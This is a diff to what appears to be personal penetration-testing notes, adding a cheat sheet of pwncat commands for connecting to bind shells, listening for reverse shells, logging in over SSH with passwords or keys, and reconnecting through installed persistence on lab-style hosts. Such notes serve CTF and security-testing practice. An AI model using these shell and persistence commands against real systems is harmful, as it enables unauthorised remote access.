@@ -98,7 +98,56 @@ I think remmina is slow, compared to xfreerdp.
 
 <code>git clone https://github.com/calebstewart/pwncat.git; cd pwncat</code>
 
-<b>pform@attacker~: </b><code>pwncat -l -p 5555</code>
+<b>Connect to a bind shell</b>
+
+pwncat connect://10.10.10.10:4444
+
+pwncat 10.10.10.10:4444
+
+pwncat 10.10.10.10 4444
+
+<b>Listen for reverse shell</b>
+
+pwncat bind://0.0.0.0:4444
+
+pwncat 0.0.0.0:4444
+
+pwncat :4444
+
+pwncat -lp 4444
+
+<b>Connect via ssh</b>
+
+pwncat ssh://user:password@10.10.10.10
+
+pwncat user@10.10.10.10
+
+pwncat user:password@10.10.10.10
+
+pwncat -i id_rsa user@10.10.10.10
+
+<b>SSH w/ non-standard port</b>
+
+pwncat -p 2222 user@10.10.10.10
+
+pwncat user@10.10.10.10:2222
+
+<b>Reconnect utilizing installed persistence</b>
+
+<b>If reconnection failes and no protocol is specified,<b>
+
+<b>SSH is used as a fallback.</b>
+
+pwncat reconnect://user@10.10.10.10
+
+pwncat reconnect://user@c228fc49e515628a0c13bdc4759a12bf
+
+pwncat user@10.10.10.10
+
+pwncat c228fc49e515628a0c13bdc4759a12bf
+
+pwncat 10.10.10.10
+
   
 I prefer pwncat as you can just press<b>"CTRL+D"</b> and download and upload files like this:
 
